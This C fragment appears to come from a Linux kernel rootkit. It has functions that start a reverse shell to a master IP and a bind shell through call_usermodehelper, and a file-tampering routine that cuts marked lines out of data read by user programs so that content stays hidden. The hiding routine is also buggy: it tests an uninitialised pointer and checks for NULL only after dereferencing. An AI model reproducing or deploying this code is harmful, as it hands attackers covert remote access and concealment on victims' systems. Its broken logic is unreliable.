static inline char *n_kmalloc(ssize_t size)  {
	char *retme;
	
	retme = kzalloc((size + 1) * sizeof(char), GFP_KERNEL);
	
	return retme;
}

void bds_reverse_shell(struct work_struct *work) {
	int rc;     
	char* argv[] = {"/opt/bds_elf/bds_rr", MASTER_IP, NULL};

	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void bds_bindshell(struct work_struct *work) {
	int rc;     
        char* argv[] = {"/opt/bds_elf/bds_br",  NULL};

	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static inline int atoi(char *str) {
        int res = 0, i;
	
        for (i = 0; str[i] >= '0' && str[i] <= '9'; ++i)
                res = 10 * res + str[i] - '0';
        return res;
}


/* --------------------- FILE CONTENT TAMPERING --------------------- */
char *path_from_fd_or_from_file_struct(int fd, struct file *f){
	struct file *file;
	struct path path;
	// in context
	struct files_struct *files = current->files;
	char *tmp, *pathname = "", *rpathname = kmalloc(1, GFP_KERNEL);
	spin_lock(&files->file_lock);
	if (fd != -1 && fd > 0 && f == NULL) {
		file =  files_lookup_fd_rcu(files, fd);
		if (!file) {
			spin_unlock(&files->file_lock);
			return rpathname;
		}
	}
	else if (f != NULL && fd == -1) {
		file = f;
	}
	else {
		return NULL;
	}
	path = file->f_path;
	path_get(&file->f_path);
	spin_unlock(&files->file_lock);
	tmp = (char *)__get_free_page(GFP_KERNEL);
	if(!tmp){
		path_put(&path);
		return rpathname;
	}
	pathname = d_path(&path, tmp, PAGE_SIZE);
	path_put(&path);

	if(IS_ERR(pathname)){
		free_page((unsigned long)tmp);
		return rpathname;
	}
	rpathname = kstrdup(pathname, GFP_KERNEL);
	free_page((unsigned long)tmp);
	return rpathname;
}


int file_check_prefix_suffix(void *user_buf, ssize_t size, char *prefix, char *suffix)
{
    int ret = 0;
	char *kbuf;

	if ((size <= 0))
		return ret;

	kbuf = (char *)kmalloc(size + 1, GFP_KERNEL);
	if (kbuf == NULL)
		return ret;

	if (copy_from_user((void *)kbuf, (void *)user_buf, size))
		goto out;

	kbuf[size] = 0;

	if ((strstr(kbuf, prefix) != NULL) && (strstr(kbuf, suffix) != NULL))
		ret = 1;

out:
	kfree(kbuf);
	return ret;
}

int hide_file_content(void *user_buf, ssize_t size, char *prefix_, char* suffix_)
{
	char *kbuf, *prefix, *suffix;
	int i, newret;

	kbuf = (char *)kmalloc(size, GFP_KERNEL);
	if (kbuf == NULL)
		return -1;

	if (copy_from_user((void *)kbuf, (void *)user_buf, size)) {
		kfree(kbuf);
		return size;
	}

	prefix = strstr(kbuf, prefix_);
	
	if(suffix == '\n') 
		suffix = strstr(prefix_, suffix_);
	else
		suffix = strstr(kbuf, suffix_);
	
	suffix += strlen(suffix);

	// we want to remove whole line, so go to line beginning for the prefix 
	while (prefix > kbuf && *prefix != '\n')
        --prefix;

    if (*prefix == '\n') {
            ++prefix;
    }

	if (prefix >= suffix || prefix == NULL || suffix == NULL) {
		kfree(kbuf);
		return size;
	}

	i = size - (suffix - kbuf);
	// move memory from p2 (from SUFFIX END) to p1 (to PREFIX START)
	memmove((void *)prefix, (void *)suffix, i);
	newret = size - (suffix - prefix);

	if (copy_to_user((void *)user_buf, (void *)kbuf, newret)) {
		kfree(kbuf);
		return size;
	}

	kfree(kbuf);
	return newret;
}


